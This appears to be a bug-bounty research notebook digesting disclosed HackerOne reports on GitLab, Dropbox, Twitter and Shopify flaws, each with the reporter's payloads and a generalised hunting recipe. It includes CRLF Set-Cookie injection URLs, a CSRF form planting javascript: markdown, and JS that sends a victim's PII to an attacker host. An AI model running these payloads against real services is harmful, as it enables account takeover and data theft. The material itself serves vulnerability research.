  6. Scale it: "Since snippet ids are sequential, an attacker could in theory create a snippet, then iterate from 1 to the snippet number of their own snippet and obtain the titles of all personal snippets." Cover tracks with the DELETE step above; optional social-engineering amplifier — if the attacker's project is public/internal with a label or an issue reference in the comment, the victim sees the label ("This could be used as a social engineering vector to obtain the file contents of a snippet").
DETECTION SIGNAL: a route whose target is expressed as a TYPE + ID pair (`target_type`/`noteable_type`/`commentable_type`/`subject_type`/`owner_type`/`resource_type`) or as a polymorphic global id; the decisive artefact is the finder/resolver's per-type branch list — look for one branch that returns an UNSCOPED relation (`.all`, unscoped model, no `current_user`/`project` predicate) beside branches that call a scoped finder. Secondary signal: activity/notification/audit feeds that render the parent object's title next to your own action, and sequential ids on the parent object.
CHAIN: any authenticated user with one project and one issue of their own (primitive: no privileged role, no victim interaction) → the note route's `target_type` is attacker-chosen and the `personal_snippet` branch resolves the target to `PersonalSnippet.all` (primitive: missing ownership check on one branch of a polymorphic finder) → create/edit/delete notes on another user's PRIVATE personal snippet (escalation: cross-tenant write, i.e. content injection + deletion inside a private object, plus a visible notification to the victim) → the attacker's OWN activity feed echoes the note together with the victim object's TITLE, and snippet ids are sequential ⇒ bulk enumeration of the titles of all private personal snippets (impact: unauthorized write on private objects + sensitive-metadata disclosure at scale; medium upstream). RELATED-BUT-DISTINCT from the recorded GitLab global-id type-confusion entry (§17.132 / `destroySnippet` + `DiffNote#repository` → repository deletion): that one confuses the GLOBAL-ID NAMESPACE of a mutation resolver; this one confuses the TYPE VALUE of a note route and the defect is a finder branch that returns an unscoped relation.
TRANSFERABLE TEST: for every comment/note/attachment/tag/assignment route, the target is a pair — enumerate EVERY type value the polymorphic layer knows (`issue`, `merge_request`, `snippet`, `project_snippet`, `personal_snippet`, `commit`, `epic`, `design`, `alert`, `vulnerability`, …), including the ones the UI never sends from that screen, and replay the IDENTICAL create/update/delete request with your own id in the path and a foreign type + a foreign id in the pair; a 200 with the note created on the foreign object is the bug. Then read YOUR OWN feed/activity page for the parent object's title, and enumerate the parent ids. RULE: polymorphic target parameters are where scoping gets skipped — the branch that takes the "other" type is usually the one that forgot the scope, and any write you can aim at a foreign object is also a read of that object if your own feed echoes it.

SOURCE: https://hackerone.com/reports/1031240   2026-11-08
ROUTE: the report body was NEVER disclosed — `.json` HTTP 404, rendered page 302 → `https://hackerone.com/users/sign_in` (Cloudflare 403), `r.jina.ai` returns the SPA/Cloudflare shell only, `web_extract` 403, the GraphQL oracle `POST https://hackerone.com/graphql {"query":"query { report(id: 1031240) { id title } }"}` answers `{"errors":[{"message":"Report does not exist","type":"NOT_FOUND"}]}` (the same call returns #1630669's title, so the oracle works). The route that WORKED: the report's own JSON as archived — `http://web.archive.org/web/20210225120851id_/https://hackerone.com/reports/1031240.json` (HTTP 200, 6,246 B; snapshot taken 2021-02-25 12:08:51 UTC, i.e. minutes after the 08:30:18Z disclosure). In it `vulnerability_information` is EMPTY (`visibility: "no-content"`, all `activities[].message` empty), but `summaries` is populated and carries BOTH the researcher's and the Dropbox triager's own summaries — quoted verbatim below; the page's `og:description` in the same-era HTML snapshot (2021-02-25, 4,255 B) carries the first ~200 chars of the team summary. Metadata: Dropbox, "`account_info.read` scope OAuth app access token can change token owner's account name.", `severity_rating: medium` (CVSS 5.7 per the public hacktivity dump), bounty $1,728, reporter `cybxis`, created 2020-11-11, disclosed 2021-02-25, substate Resolved.
STATUS: UNVERIFIED (not reproduced — the endpoint is long fixed and no Dropbox app exists in this pipeline's scope; the method is the report's own summary text, read at the archived source this pass)
CLASS: broken access control / missing SCOPE enforcement — an OAuth access token carrying only a READ scope is accepted by an UNDOCUMENTED, internal-use WRITE route, because that route was never annotated with the scope it requires (and never restricted to first-party apps).
CORE METHOD (verbatim from the two summaries in the archived report JSON):
  1. Researcher summary (`category: "researcher"`, user `cybxis`): "By using the endpoint `/2/account/change_name` to change the user's full name, I found out that it accepts OAuth requests but does not validate scope limitation. By using an access token with a read-only scope, I have successfully changed the token owner's full name. This allows any application owner to change every app users' dropbox name despite the the fact that the granted scope is insufficient. The Dropbox team rapidly mitigated this issue and restricted the usage of the endpoint from Scoped Access Apps."
  2. Team summary (`category: "team"`, user `aegarbutt_dbx`): "Previously, Dropbox API was split between App Folder and Full Dropbox apps. After the recent introduction of Scoped Access apps, which use OAuth scopes, a number of routes meant specifically for internal use were neither restricted to internal apps nor were they annotated with required scopes. A new or migrated Scoped Access app with low-privileged scopes was able to make calls to these undocumented routes. This did not affect existing App Folder apps."
  3. So the probe needs three things only: a scoped OAuth app you can register, an access token with the LOWEST scope the platform insists on (`account_info.read` here, granted by any user who authorizes the app), and the name of an internal/undocumented route (`/2/account/change_name`) — the write succeeds although the token never held `account_info.write`.
  4. Scale is the multiplier: the token belongs to every user who authorized the app, so ONE app can rewrite the display name of its entire user base ("any application owner [can] change every app users' dropbox name"), i.e. an authenticated identity-integrity action performed on all users of the integration.
DETECTION SIGNAL: an API where scope enforcement is a per-route ANNOTATION rather than a table: the tell is a route family whose names never appear in the public docs/SDK (`change_*`, `set_*`, `update_*`, `_internal`, versioned `/2/`, `/v3/`, BFF/mobile paths) reachable with a minimal token; the oracle is the API's error vocabulary — `missing_scope` / `insufficient_scope` (the annotation exists) versus a domain error or a 200 (the route ran regardless of the scope you hold). Newly-scoped platforms are the best hunting ground: the migration covers the documented surface and leaves the internal routes unannotated.
CHAIN: any OAuth integration registered by the attacker, even one asking for a single read scope the users happily grant (primitive: no privileged role, no user interaction beyond the ordinary consent screen) → the token is accepted by an undocumented internal write route whose scope annotation was never added during the platform's transition to scoped access (primitive: missing function-level authorization / scope check) → the attacker rewrites the account name of ANY user who authorized the app (escalation: authenticated identity modification, reversible and repeatable, not a read) → and because the token is per-user and app-wide, the same one request is a bulk modification of the whole user base (impact: integrity of account identity at scale; rated medium / $1,728 upstream because no data or funds moved). Chain-only note: the reaction is to treat EVERY minimal-scope token as a probe credential, not just as a read token.
TRANSFERABLE TEST: take the least-privileged token the platform will give you (a read-only scope on an OAuth app you register yourself) and enumerate the API's WRITE-shaped and internal routes against it — from the docs, from the JS/mobile bundle, and from versioned prefixes the docs omit (`/2/…`, `/v3/…`, `/internal/…`) — sending the same minimal `Authorization: Bearer <read-token>`. A 200/domain error where you expected `missing_scope`/`insufficient_scope` IS the finding; then check whether the token is per-user (i.e. the impact multiplies over every user of the integration). RULE: when a platform migrates to scopes, the enforcement lives in per-route annotations — hunt the routes that are not in the SDK, and judge the response by its ERROR VOCABULARY, not by the documented permission list.

SOURCE: https://hackerone.com/reports/1468010  (report unreachable — technique read in the credited public writeup: https://github.com/httpvoid/writeups/blob/main/Hacking-Google-Drive-Integrations.md)   2026-11-08
ROUTE: assigned source 6 is NOT anonymously reachable as a report: `.json` HTTP 404, rendered page 302 → `users/sign_in` (Cloudflare 403), `r.jina.ai` returns the Cloudflare/SPA shell (511 B), `web_extract` 403, GraphQL `report(id: 1468010)` → `Report does not exist`, no archived `.json` snapshot exists (CDX has only a 2022-06-01 HTML capture, JS-only shell). What IS recoverable from the archive is the report's own public summary line, in the HTML capture's `og:description` (verbatim): "The report demonstrates a method of redirecting Google Drive OAuth tokens from Dropbox. A fix for the issue has been released and it was applied for existing users through an automatic update. An attacker could exploit this vulnerability by getting a user to visit a specially-crafted link that set a parameter to redirect their Google OAuth token to the attacker." (metadata from the hacktivity dump: Dropbox, CSRF, bounty $1,728, 32 upvotes.) The TECHNIQUE was read this pass in the credited public writeup for the same Dropbox Google-Drive-integration token-theft family by the same researcher (@rootxharsh / HTTPVoid) — `https://raw.githubusercontent.com/httpvoid/writeups/main/Hacking-Google-Drive-Integrations.md`, 8,242 B, read IN FULL; it points at the Dropbox SSRF report #1406938 ($17,576) and dayzerosec's independent analysis (2022-05-23) names the CSRF link of exactly this chain ("the page leading to the SSRF itself had no CSRF protection so an attacker could have any victim upon visiting their HelloSign link leak their Google Drive Authorization Token"). Attribution is kept explicit: the CSRF summary line is the report's own; the request shapes and the `alt=media` trick are the writeup's.
STATUS: UNVERIFIED (not reproduced — no Dropbox/HelloSign Google-Drive connector is available to test; the mechanism is read first-hand from the credited writeup this pass, and the CSRF link from the report's own public summary via the archive)
CLASS: SSRF via a third-party-integration connector that fetches with the USER'S OWN OAuth token, where the provider's response-FORMAT parameter (`alt=media`) lets the attacker replace the JSON metadata the app parses — chained with an unprotected link (CSRF) to steal the victim's provider access token, i.e. cross-provider account/credential theft.
CORE METHOD (writeup's own steps, with its code shape):
  1. Locate the connector shape: a server-side fetch of a user-supplied file whose id is CONCATENATED into the provider API path — `GET /cloud/gdrive/fetch?file_id=<id>&access_token=<token>` → backend runs `requests.get('https://www.googleapis.com/drive/v2/files/' + file_id, headers={'Authorization': 'Bearer ' + token})`, takes `json.loads(r.text)['downloadUrl']`, then fetches that URL with the same `Authorization: Bearer <token>` header. "We have control in path of the HTTP request made to www.googleapis.com via the file_id. This means we can do a path traversal and add query parameters."
  2. The primitive that does not need an open redirect: `alt=media` — "There's this magic parameter `alt=media` which would serve the file itself rather than the JSON object and now if the application is relaying on parsing the JSON and extracting `downloadUrl`, we have control over it." So `file_id=<your_file_id>?alt=media` makes the provider return ATTACKER-AUTHORED BYTES where the app expects a file-metadata JSON.
  3. Weaponise: "Create a file call it payload.txt / Place same File JSON Object into it / Change the downloadUrl to your URL / Make a request with `file_id=fildId?alt=media&access_token=abcdef`" → the app parses YOUR JSON, extracts YOUR `downloadUrl`, and makes a server-side request to YOUR host with the victim's `Authorization: Bearer <token>` header attached — the token leaves the app in a request header you control.
  4. When only path traversal is available (no query-parameter injection), the same outcome via CRLF in any JSON field that is later placed into a HEADER, plus pipelining: `{"fileId":"test","fileName":"test","authToken":"x\r\nSSRF:http://rce.ee/aaaaazzzzza\r\nConnection:keep-alive\r\n\r\nGET /drive/v2/files/1XfY_BqdWT-UWM2CNivW1lSR2GhRCizdJ?alt=media HTTP/1.1\r\nHost:www.googleapis.com\r\nAuthorization: Bearer ***","fileType":"slides"}` — "the `authToken` property which adds its value in request headers suffers from a CRLF thus allowing us to control part of request headers/body… Using this I was able to craft a new request to www.googleapis.com with my controlled query params using request pipelining."
  5. The CSRF link (#1468010's own summary): the page reached by the crafted link is the SSRF primitive, and with no CSRF protection on it "an attacker could have any victim upon visiting their HelloSign link leak their Google Drive Authorization Token" — the victim supplies the token, the attacker's server receives it; the chain then reaches the victim's whole Drive (the writeup's variant was "Dropbox's Full Read SSRF", $17,576; the CSRF variant is the assigned report, $1,728).
DETECTION SIGNAL: a file/render/preview/import/download endpoint whose parameter (`file_id`, `document_id`, `resource_id`, `drive_id`, `attachment_ref`) is concatenated into an upstream provider URL, with the caller's own `access_token` visible in the request or the link; a connector that PARSES a JSON response and then performs a SECOND fetch to a URL taken from that JSON (`downloadUrl`, `url`, `webContentLink`, `thumbnailLink`); a response-format switch on the provider's own API (`alt=media`, `?format=raw`, `export=download`) that changes metadata into raw bytes; and any JSON field that ends up in a request header (CRLF → header/body control).
CHAIN: attacker-crafted link (no CSRF token on the integration page) → the victim visits it and the app performs the Drive fetch for them (primitive: victim's own session/token, no attacker privileges) → the injected `?alt=media` makes the provider return the ATTACKER'S file bytes where the connector expects file METADATA (primitive: response-format confusion / JSON injection into the app's own parser) → the connector follows the `downloadUrl` the attacker authored, carrying `Authorization: Bearer <victim's Drive token>` → the victim's third-party OAuth access token lands in the attacker's logs (escalation) → full read of the victim's Google Drive, and the same token is reusable against Google's API directly (impact: cross-provider credential theft / account access — P1/P2-shaped, $17,576 for the SSRF form, $1,728 for the CSRF form).
TRANSFERABLE TEST: take any integration that fetches a third-party document server-side with the user's token and a path-concatenated id, then (a) append the provider's format switch to the id (`file_id=<your_id>?alt=media`), (b) upload a file whose CONTENT is that provider's metadata JSON with the URL field (`downloadUrl`/`url`) pointing at your listener, (c) trigger it and check your listener for the user's token in the `Authorization` header — a hit is full credential theft, not just SSRF. If the id is not query-injectable, hunt CRLF in every JSON field that reaches a HEADER and pipeline the extra query param. RULE: on an integration the app is holding the USER's token and will happily send it to a URL you author — so the "SSRF" here is systematically an OAuth-token exfiltration; and always test the provider's format switch before hunting an open redirect, because controlling the RESPONSE BODY is enough.

SOURCE: https://hackerone.com/reports/191380   2026-11-08
ROUTE: assigned source 3, read IN FULL this pass on the `.json` route — `curl -A "<desktop Chrome UA>" https://hackerone.com/reports/191380.json` → HTTP 200, 14,060 B, `vulnerability_information` 2,499 B. Metadata: X / xAI (team handle `x`, asset `ton.twitter.com`), "CRLF and XSS stored on ton.twitter.com", weakness `Cross-site Scripting (XSS) - Generic`, reporter `seifelsallamy`, created 2016-12-15, disclosed 2017-07-05, substate resolved. NOTE the report is 2016 material (outside the 6–12-month freshness window) — recorded for the CHAIN, not for freshness; every quote below is the reporter's, opened this pass.
STATUS: UNVERIFIED (not reproduced — no ton.twitter.com/media-host equivalent was stood up and no target was touched; the mechanism is the reporter's own, quoted verbatim below)
CLASS: CRLF injection in a URL PATH in its MUTATED / Unicode-normalised form (`%E5%98%8A%E5%98%8D`, i.e. U+560A U+560D, instead of `%0d%0a`) → `Set-Cookie` header injection → SESSION ADOPTION in the victim's browser → the session makes the ATTACKER's otherwise-invisible private content visible in the victim's page → that content is stored HTML (an upload renamed `.jpg`→`.html`) ⇒ stored XSS against a victim the attacker has no relationship with. The chain is the finding; CRLF alone is a primitive.
CORE METHOD (the reporter's own steps, payloads and quotes):
  1. CRLF primitive, mutated encoding: put the CR/LF pair into the PATH as `%E5%98%8A%E5%98%8D` and follow it with a whole response header value: `https://ton.twitter.com/1.1/ton/data/dm/x/%E5%98%8A%E5%98%8Dset-cookie%3A%20test%3Dtest%3B%20Domain%3D.twitter.com%3B%20Path%3D%2F%3B%20Expires%3DSat%2C%2015-Dec-2018%2009%3A45%3A55%20UTC` → "you will find that `test` cookie with the value `test` has been added to your cookies" (reporter's framing: "It's similar to #52042 but weaker"). The oracle is the COOKIE JAR, not the status code.
  2. Stored-HTML half: upload a `.jpg` to the DM image host and "chang[e] the extension from `.jpg` to `.html`"; the file is served from `https://ton.twitter.com/i/ton/data/dm/123456789/987654321/AbCdEf.jpg:large` — "remove the last part `:large` and put `%23.html`" → "XSS popup box will popup" (upload id `F143743`; PoCs `F143759`, `F143760`, `F143761`). The reporter states the honest bound himself: "this image can only appear to you and to the one who you send it to because it is a private message and to send the message you have to follow the victim and the victim has to follow you in most cases and ton.twitter.com has no valuable cookies at all so the impact will be a phishing page or let the victim downloading a malicious software".
  3. THE CHAIN — why the pair is worth more than either half: ton.twitter.com renders the image to whoever presents a valid `auth_token` entitled to see it, so injecting YOUR `auth_token` into the VICTIM's jar makes the victim's browser fetch YOUR private image. The reporter's combined URL, verbatim: `https://ton.twitter.com/1.1/ton/data/dm/809353163740483587/809353151434330112/O5hEYiOt.jpg%2523.html%E5%98%8A%E5%98%8Dset-cookie%3A%20auth_token%3Db2868e3d5fd901a1cf4819afd147ee893f331294%3B%20Domain%3D.twitter.com%3B%20Path%3D%2F%3B%20Expires%3DSat%2C%2015-Dec-2018%2009%3A45%3A55%20UTC%3BSecure%3BHTTPOnly` — note `.jpg%2523.html` (DOUBLE-encoded `#`, so the injected `.html` extension survives the redirect) and that the injected cookie carries `Secure; HTTPOnly` (a Set-Cookie injection is not limited by the flags the app uses for its own cookies). The reporter's own summary of the three effects: "[1] change auth_token value to my own `auth_token` value to make the injected image appear in your pc, [2] will redirect you to the injected imaged, [3] Javascript will be executed causing attacker's phishing page to appear".
  4. Claimed extra impact, the reporter's own words, NOT verified here: "[1] phishing, [2] crlf injection (cookie injection & DOS may occur & cache poisoning), [3] under certain circumstances it may lead to bypassing CSP in https://twitter.com".
DETECTION SIGNAL: a media/attachment/CDN host that reflects the request PATH into RESPONSE headers and accepts a mutated or over-long CR/LF encoding where `%0d%0a` is filtered — probe `%0d%0a`, then `%E5%98%8A%E5%98%8D`, `%E5%98%8D%E5%98%8A`, `%0a%0d`, `%250d%250a`, each followed by `Set-Cookie:%20<name>%3Dprobe`, and read your COOKIE JAR; a host that serves an object by the EXTENSION taken from a value you can append (`#.html`, `#.svg`) after dropping a size/transform suffix (`:large`, `:orig`, `?w=`); and content whose PORTAL/visibility is decided by a COOKIE (your identity) rather than by an ACL check on the requester — that is the link that turns a private upload into a cross-user XSS.
CHAIN: URL with a mutated-CRLF path on the image host (primitive: response-header injection — the reporter himself calls it "weaker" than #52042, i.e. P4 alone) → `Set-Cookie: auth_token=<attacker's>; Domain=.twitter.com` written into the VICTIM's browser (primitive: session adoption / cookie injection) → the same host now renders the ATTACKER's private DM image inside the VICTIM's page although neither user follows the other (primitive: visibility gate bypassed by the session, not by an ACL) → that object is stored HTML because the upload's extension was renamed `.jpg`→`.html` and the raw object is reachable by dropping `:large` and appending `%23.html` (escalation) → arbitrary script executes in the victim's session on the media origin with zero attacker↔victim relationship (impact: stored XSS / phishing / drive-by download on the vendor's own domain; the report additionally claims cookie-injection DoS, cache poisoning and a twitter.com CSP bypass). Every link carries its own request above.
TRANSFERABLE TEST: (a) on every media/attachment/CDN host in scope, take the path and try `%0d%0a` first, then the mutated forms (`%E5%98%8A%E5%98%8D` …), each followed by a `Set-Cookie` payload — success is a cookie in YOUR jar; (b) upload a file you control, then walk the extension: append `#.html`, `#.svg`, `#.txt` and drop any size/transform suffix (`:large`, `?w=…`) to reach the raw object, and see whether the host serves it as HTML; (c) ask the decisive question — is the object's visibility decided by YOUR SESSION cookie or by an ACL on the requester? If session-gated, injecting your cookie into another browser renders your content there, which is the escalation, and the pair (CRLF + extension-renamed stored HTML on the same host) is the finding. RULE: **CRLF is never the report — ask what the injected `Set-Cookie` makes VISIBLE or ACTIONABLE in the victim's browser; the classic chain is a media host that serves by extension and gates by cookie, reached through a mutated CRLF encoding wherever `%0d%0a` is filtered.**

SOURCE: https://hackerone.com/reports/1439552   2026-11-08
ROUTE: assigned source 4, read IN FULL this pass on the `.json` route — HTTP 200, 13,406 B, `vulnerability_information` 3,660 B. Metadata: GitLab, "Gitlab Pages token theft using service workers", weakness `Improper Authorization`, severity medium, reporter `ehhthing`, created 2022-01-02, disclosed 2022-06-08, resolved. Artefacts the report links: project export `F1565711`, live attacker project `https://gitlab.com/dotchinavideo/dotchinavideo.gitlab.io`, attacker server `F1565227` (Flask + flask-cors, prints the stolen token), logs `F1565251`.
STATUS: UNVERIFIED (not reproduced — no GitLab Pages project, no service worker and no victim account were used; every step and quote below is the reporter's own, opened this pass)
CLASS: session/token theft across a WILDCARD-SUBDOMAIN boundary — a service worker registered on an ATTACKER-controlled sibling subdomain intercepts the OAuth callback (`/auth`), and the OAuth `state` CSRF control is neutralised because the attacker's own server can INITIATE the flow and hand the completed URL to the victim.
CORE METHOD (the reporter's own attack flow, condensed but quoted):
  1. Setup — get the victim onto your origin: "The attacker creates a private Gitlab Pages site at the root of their user page `attacker.gitlab.io`, ensuring that the project is `private to collaborators` for Gitlab Pages visibility", then "invites the victim to collaborate to the project, thus giving them access to the private Pages site."
  2. Standing listener: "The victim clicks on a link to `attacker.gitlab.io`, and a service worker is registered for the domain, passing through all requests back to the server except the `/auth` endpoint, which it intercepts."
  3. THE STATE BYPASS (the technique's core, verbatim): "A script on the website requests a valid session cookie and redirection URL from an attacker controlled website." → "The attacker controlled website sends its own request to `attacker.gitlab.io`, and retrieves a redirection URL and a session cookie." → "A script on the website redirects the victim to the redirection URL retrieved by the attacker, and the user authenticates (since the user is already logged in, this does not require any kind of interaction)". Nothing about `state` has to be guessed or leaked — the flow is CREATED by the attacker and only DELIVERED to the victim.
  4. Interception and exchange: "The OAuth2 service redirects the user back to `attacker.gitlab.io/auth` with the code and state, which is intercepted by the attacker's service worker and sent to the attacker controlled website. The attacker controlled website sends a request to the auth endpoint with the original session cookie and the intercepted code and state to obtain an authenticated session cookie."
  5. Root cause, verbatim: "The current behavior is that `gitlab-pages` session cookies are not properly validated to ensure that the requested subdomain is the same as the subdomain to which the session cookie was issued for." Expected: "each `gitlab-pages` session cookie be validated to prevent cross-subdomain usage."
  6. Use it: "The attacker controlled server will output a valid `gitlab-pages` session cookie, which can be inserted into a browser or curl command (`curl -v --cookie '{cookie}' https://{victim username}.gitlab.io/{private Gitlab Pages project}`) to gain access to the private Gitlab Pages project on the victim's account." Impact, verbatim: "Once an attacker has a valid Pages session token, they are able to access every private Gitlab Pages site that the victim has access to."
DETECTION SIGNAL: any product that hands each user/tenant a WILDCARD subdomain (`<user>.host.tld`, previews `<pr>.preview.…`, `<tenant>.app.tld`) AND serves an auth callback in that same namespace — every such origin can register a service worker and read EVERY request it receives, including URLs carrying `code`/`state`/`token`; a session cookie scoped to the PARENT domain instead of the exact host; a callback that validates a session cookie supplied BY THE REQUESTER (so a flow someone else created still passes); an OAuth client whose redirect URI is a wildcard/open-ended pattern rather than an exact per-app path.
CHAIN: attacker's own Pages project + one collaborator invite (primitive: the victim must load the attacker's origin once, nothing privileged is granted) → a service worker on that origin intercepts the `/auth` callback (primitive: persistent interception of an auth response on a namespace the attacker shares) → the `state` check passes because the attacker's own server created the session AND the redirect URL and simply handed the victim the URL that completes the flow (primitive: `state` validates the FLOW, not the BROWSER) → the code is exchanged using the attacker's pre-created session cookie and the minted `gitlab-pages` cookie is NOT bound to its issuing subdomain (primitive: cross-subdomain cookie replay) → the stolen cookie opens every private Pages site the victim can reach (impact: bulk read access to the victim's private Pages estate, zero interaction beyond opening one link; upstream rated medium). Every link carries its own request above.
TRANSFERABLE TEST: on any product with per-user/per-tenant subdomains, (a) register a project/app on YOUR subdomain, install a service worker that intercepts the AUTH CALLBACK path and forwards it off-origin, and drive the flow from YOUR server — fetch the authorize/session bootstrap yourself and hand the victim the resulting redirect URL; if the completed code+session pair validates when you replay it with `curl --cookie '{stolen}'` against the victim's own protected resource, the callback is not bound to the victim's browser; (b) probe the cookie binding directly: authenticate on `a.host.tld` and replay the cookie on `b.host.tld` and on `<victim>.host.tld`. RULE: **an OAuth `state` is not a CSRF defence when the origin that RECEIVES the callback can also INITIATE the flow — pre-create the flow server-side (session + redirect URL), hand the victim the URL that completes it, read the code from a service worker on your own namespace; and always test whether a session cookie minted on one wildcard subdomain is accepted on another.**

SOURCE: https://hackerone.com/reports/2509022   2026-11-08
ROUTE: assigned source 6, read IN FULL this pass on the `.json` route — HTTP 200, 10,858 B, `vulnerability_information` 5,084 B. Metadata: Shopify, "Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering", weakness `Cross-site Scripting (XSS) - Reflected`, severity medium, reporter `saltymermaid`, created 2024-05-16, disclosed 2026-06-18, resolved.
STATUS: UNVERIFIED (not reproduced — no help.shopify.com session, no CSRF page and no attacker listener were used; the payload, request shapes and decoded JS below are the reporter's own, opened this pass). LOCAL LAB RUN THIS PASS (no target touched, no request left this host): the markdown→HTML stage was measured with markdown-it 15.0.3, marked 18.1.3 and python-markdown 3.10.2 — `marked` (BOTH default and with `{sanitize:true}`) emitted `<a href="javascript:alert(1)">x</a>` for `[x](javascript:alert(1))` and `<img src="javascript:alert(1)">` for `![x](javascript:alert(1))` with no scheme filtering at all; python-markdown also emitted the `javascript:` src; markdown-it (commonmark preset, `html:true,linkify:true`) REFUSED the destination and left the literal text — so the sink is the RENDERER's URL validator (markdown-it's `validateLink`), and a renderer that strips your `javascript:` means a different library or an app-level sanitizer/link stage is in the path.
CLASS: reflected XSS through a CHATBOT's MARKDOWN RENDERER, planted by a CSRF-able "chat greeting" write into the VICTIM's session, escalated through the framework's hydration state (bulk PII read) and an authenticated support-chat GraphQL mutation (attacker becomes a subscriber/participant of the victim's conversation).
CORE METHOD (the reporter's own steps and payloads):
  1. Entry — a POST that stores the greeting in the caller's session, with no CSRF token: form action `https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search`, `method="POST"`, fields `query=Is this XSS?` and `greeting=![Mouse wheel click here for more info...](javascript:eval(atob('<base64 payload>')))`. Reporter, verbatim: "The issue starts with the following CSRF where a POST request is made to `https://help.shopify.com/en/search` to set the AI greetings in the victim's session."
  2. The payload IS markdown image syntax whose destination is a `javascript:` URL: "the value of the `greeting` input with the base64 encoded payload is set via the markdown image `![Mouse wheel click here for more info...](...payload...)`". The CSRF page auto-submits the POST and, 2 s later, GETs `…/en/search?_data=routes%2F%28%24locale%29.search&q=Is this XSS?` so the greeting renders: "You should be automatically redirected to `https://help.shopify.com/en/search/{some-token-here}` and the AI chat greetings should contain the broken markdown image".
  3. Trigger: "Because the link has `target=_blank`, you will sadly need to mouse wheel click the link to trigger the XSS" (middle/mouse-wheel click on the rendered link; the reporter's own constraint — a plain click just opens a new tab).
  4. What the decoded JS does — TWO escalations in the reporter's own code: (a) **PII exfil from the framework hydration blob**: `fetch('//<attacker>?' + JSON.stringify(window.__remixContext.state.loaderData.root.userInfo))` — the reporter's comment: "At worst, if no support conversation exists, we leak victims' PII to attacker's controlled domain"; (b) **support-conversation takeover**: `POST /messages/graphql` with headers `content-type: application/json` + `x-shopify-react-xhr: 1` and query `query convs { conversations(last: 1) { edges { node { id } } } }` to read the victim's last conversation id, then a second `POST /messages/graphql` with `mutation subscriberCreate { subscriberCreate(conversationId: "<cid>", email: "saltymermaid@wearehackerone.com") { __typename } }` — "Try to subscribe to the victim's conversation which will send an email to the attacker and allow him to join the conversation."
  5. The reporter's own verification of both: "First, notice that some of your PII have been leaked to `https://<attacker>/` … Second, notice that `saltymermaid@wearehackerone.com` was added as a subscriber of your last conversation."
DETECTION SIGNAL: a chat/assistant/support surface that renders MARKDOWN from a value stored in the session (greeting, signature, display name, saved query, canned reply, model output) — enumerate every field the bot echoes that you did not type in THAT message; a state-changing POST that writes such a value with no CSRF token and no `Origin`/`Sec-Fetch-Site` check; a renderer whose image/link destinations accept a scheme (`javascript:`, `JaVaScRiPt:`, `data:`, `vbscript:` — test the TARGET's rendered output, since the local lab above shows popular libraries disagree); a front-end framework that hydrates a serialised state blob into a global (`window.__remixContext`, `__NEXT_DATA__`, `__NUXT__`, `__APOLLO_STATE__`, `window.__INITIAL_STATE__`) because one `fetch` of that global is a bulk PII read; and a per-object GraphQL mutation that accepts an arbitrary `email`/`userId` (`subscriberCreate`, `participantAdd`, `CC`/watcher add) with no ownership check on the object id.
CHAIN: unauthenticated CSRF page (primitive: a CSRF-able write on a benign-looking search endpoint — P4 alone) → the victim's session stores an attacker-chosen `greeting` → the chatbot renders that greeting as markdown and consumes the destination as a `javascript:` URL (primitive: scheme not validated by the renderer) → one middle-click executes attacker JS in the `help.shopify.com` origin (escalation) → one `fetch` of `window.__remixContext.state.loaderData.root.userInfo` exfiltrates the victim's PII, and `subscriberCreate(conversationId: <victim's last conversation>, email: <attacker>)` adds the ATTACKER's address to the victim's SUPPORT CONVERSATION so the attacker is emailed into its history and can post as a participant (impact: PII disclosure + authenticated mutation on the victim's support account; upstream rated medium/reflected, reporter: "the impact is pretty clear"). Every link carries its own request above.
TRANSFERABLE TEST: find a value the app renders back to you AND lets you write into someone else's session (chat greeting, profile bio, saved search, email signature, ticket subject, canned response), then (a) plant it from a cross-site auto-submitting form — if the write succeeds without a token the planting step is free; (b) put `![x](javascript:alert(document.domain))` (then `[x](javascript:…)`) in the field and read the RENDERED HTML, not the field; (c) if the scheme is neutralised, switch vector — raw-HTML `onerror` where `html:true` is allowed, an SVG/`data:` destination where schemes are filtered, or the same field in a second renderer (email, export, transcript); (d) once script runs, dump the hydration global (`JSON.stringify(window.__remixContext?.state ?? window.__NEXT_DATA__)`) to your collaborator AND replay the app's own GraphQL endpoints with the victim's cookies — a mutation that adds your email/participant to the victim's object is a second, independent finding that survives even if the XSS is written down as reflected-only. RULE: **a chatbot's session-echoed "greeting" is a stored-XSS sink with a free planting step (CSRF); the markdown renderer's own HTML is the oracle because the scheme filter lives in the renderer and popular libraries disagree — and always look behind the XSS for the hydration blob and the per-object subscribe/add mutation, since those are what turn a reflected XSS into PII disclosure and account-level access.**
